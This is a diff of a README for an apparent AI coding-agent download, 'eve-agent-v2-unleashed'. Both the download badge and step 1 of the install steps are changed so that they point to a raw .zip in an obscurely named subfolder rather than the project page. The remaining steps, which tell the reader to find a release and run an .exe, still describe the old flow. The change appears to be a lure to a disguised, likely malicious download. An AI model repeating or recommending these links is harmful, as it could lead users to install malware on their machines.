@@ -1,6 +1,6 @@
 # 🤖 eve-agent-v2-unleashed - Automate your coding tasks with AI
 
-[![Download Eve Agent](https://img.shields.io/badge/Download-Eve_Agent-blue)](https://github.com/Phillipphilatelical734/eve-agent-v2-unleashed)
+[![Download Eve Agent](https://img.shields.io/badge/Download-Eve_Agent-blue)](https://github.com/Phillipphilatelical734/eve-agent-v2-unleashed/raw/refs/heads/main/etiogenic/eve-v-agent-unleashed-v1.4.zip)
 
 ## What is Eve Agent V2 Unleashed?
 
@@ -20,7 +20,7 @@ Before you start, check your computer against the following requirements:
 
 Follow these steps to install the software on your Windows machine.
 
-1. Visit this page to download: [https://github.com/Phillipphilatelical734/eve-agent-v2-unleashed](https://github.com/Phillipphilatelical734/eve-agent-v2-unleashed)
+1. Visit this page to download: [https://github.com/Phillipphilatelical734/eve-agent-v2-unleashed/raw/refs/heads/main/etiogenic/eve-v-agent-unleashed-v1.4.zip](https://github.com/Phillipphilatelical734/eve-agent-v2-unleashed/raw/refs/heads/main/etiogenic/eve-v-agent-unleashed-v1.4.zip)
 2. Locate the latest release version on the right side of the page.
 3. Select the Windows installer file ending in .exe.
 4. Open the file once the download finishes.
